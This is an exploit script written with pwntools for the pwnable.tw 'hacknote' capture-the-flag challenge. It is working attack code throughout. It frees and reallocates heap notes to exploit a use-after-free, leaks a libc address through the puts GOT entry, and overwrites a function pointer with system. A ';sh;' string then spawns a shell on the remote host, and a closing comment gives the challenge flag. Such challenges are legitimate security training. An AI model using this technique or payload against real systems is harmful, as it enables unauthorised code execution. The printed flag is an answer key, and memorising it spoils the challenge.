from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./hacknote')
	system_offset = 0x03ada0
	puts_offset = 0x05fca0
else:
	host, port = "chall.pwnable.tw", 10102
	r = remote(host, port)
	libc = ELF('./libc_32.so.6')
	system_offset = libc.symbols['system']
	puts_offset = libc.symbols['puts']

raw_input('debug')

def add_note(size, content):
	r.sendlineafter("Your choice :", "1")
	r.sendlineafter("Note size :", str(size))
	r.sendlineafter("Content :", content)

def delete_note(index):
	r.sendlineafter("Your choice :", "2")
	r.sendlineafter("Index :", str(index))

def print_note(index):
	r.sendlineafter("Your choice :", "3")
	r.sendlineafter("Index :", str(index))


add_note(64, 'aaaaaaaaaaa')
add_note(40, 'bbbbbbbbbbbbbbbb')
delete_note(0)
delete_note(1)
add_note(8, p32(0x0804862B) + p32(0x804a024))

print_note(0)
res = r.recv(4)
leak = u32(res)
libc_base = leak - puts_offset
log.info("libc base = %#x" %libc_base)

system_add = libc_base + system_offset

delete_note(1)
add_note(8, p32(system_add) + ';sh;')
print_note(0)


r.interactive()
r.close()
# FLAG{Us3_aft3r_fl3333_in_h4ck_not3}
